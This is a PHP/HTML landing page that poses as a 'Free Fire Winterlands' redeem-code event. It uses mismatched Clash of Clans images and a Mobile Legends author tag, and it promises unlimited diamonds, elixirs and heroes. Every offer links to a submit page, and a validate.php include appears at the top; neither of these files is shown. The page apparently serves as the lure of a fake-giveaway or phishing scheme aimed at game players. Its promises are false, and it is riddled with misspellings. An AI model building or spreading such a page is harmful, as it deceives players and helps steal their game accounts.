<?php
include "validate.php";
?>
<html>
<head>
<title>Free Fire - Redeem Code</title>
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta property="og:title" content="Free Fire Winterlands - Redeem Code"/>
<meta property="og:url" content="index.html"/>
<meta property="og:description" content="Get the free fire winterlands monthly event, redeem here"/>
<meta property="og:type" content="article"/>
<meta property="article:author" content="https://www.facebook.com/MobileLegendsGame"/>
<meta property="og:image" content="img/banner.jpg"/>
<link rel="icon" type="img/png" href="http://freefiremobile-a.akamaihd.net/ffwebsite/images/app-icon.png" sizes="32x32"/>
<link rel="stylesheet" type="text/css" href="css/index.css"/>
</head>
<body>
<div class="logo">
<img src="https://i.pinimg.com/originals/1c/91/cc/1c91cc7685a7b81c37194068762a66be.png" alt="Free Fire Winterlands"/>
</div>
<img class="banner" src="https://wallsdesk.com/wp-content/uploads/2016/05/Clash-Of-Clans-Wallpapers-HD.jpg" alt="Banner"/>
<div style="clear:both"></div>
<div class="herohead">
<div class="title"><b>NEW EVENT</b> | GET FREE GIFTS</div>
<a href="submit.html.php" class="avatar" title="Alpha">
<img src="https://assets.stickpng.com/images/58eeb0c0ee9418469d17edf1.png" alt="BUNDLE"/>
<small>UNLIIMITED<br/>ARCHER</small>
</a>
<a href="submit.html.php" class="avatar" title="Alpha">
<img src="https://static.wikia.nocookie.net/clashofclans/images/0/06/Headhunter.png/revision/latest?cb=20200621142416" alt="BUNDLE"/>
<small>UNLIIMITED<br/>HEADHUNTER</small>
</a>
<a href="submit.html.php" class="avatar" title="Estes">
<img src="https://www.freepngimg.com/thumb/clash_of_clans/15-2-clash-of-clans-minion-png.png" alt="BUNDLE"/>
<small>UNLIIMITED<br/>DRAGON</small>
</a>
<a href="submit.html.php" class="avatar" title="Miya">
<img src="https://static.wikia.nocookie.net/clashofclans/images/8/8d/Royal_Champion_Info.png/revision/latest/scale-to-width-down/340?cb=20200904091828" alt="SET"/>
<small>UNLIMTED<br/>ARCHERS</small>
</a>
</div>
<ul class="news">
<li style="background-image:url(https://www.clash.ninja/images/magic-items/2.png)" alt="M4A1">INSTA FINISH PORTION<br/><small>Finsih Instantly With Unlimited Portions.</small></li>
<li style="background-image:url(https://att.cocservice.top/wordpress/uploads/2020/02/Builder_Potion.png)" alt="MP5">MAGIC PORTION<br/><small>Use Magic Like Wizards From Unlimited Magic Portion.</small></li>
<li style="background-image:url(https://pngimage.net/wp-content/uploads/2018/06/magical-chest-clash-royale-png-7.png)" alt="M1014">HIDDEN TREASURE<br/><small>Hunt Down The Treasure Unlimited.</small></li>
<li style="background-image:url(https://i.pinimg.com/originals/ef/fa/91/effa91225f7b9080051a10c1c3651982.png)" alt="AWM">DIAMONDS<br/><small>Max All With Unlimited Diamonds.</small></li>
<li style="background-image:url(https://th.bing.com/th/id/OIP.qtcnqSIu0KseekGC8SQFoQHaH4?pid=Api&rs=1)" alt="USP">UNLIIMITED HELIXER<br/><small>Max Out With Helixers.</small></li>
<li style="background-image:url(https://2.bp.blogspot.com/-H5XpM1m3sqs/WACZHOhqlCI/AAAAAAAAAEo/Oz4VqSKN7tokYSRcp1KtLu2dQOy4JMB3gCLcB/s1600/Clash-of-Clans-Dark-Elixir.png)" alt="PAN">DARK HELIXERS<br/><small>Max All With Dark Helixers.</small></li>
</ul>
</body>

</html>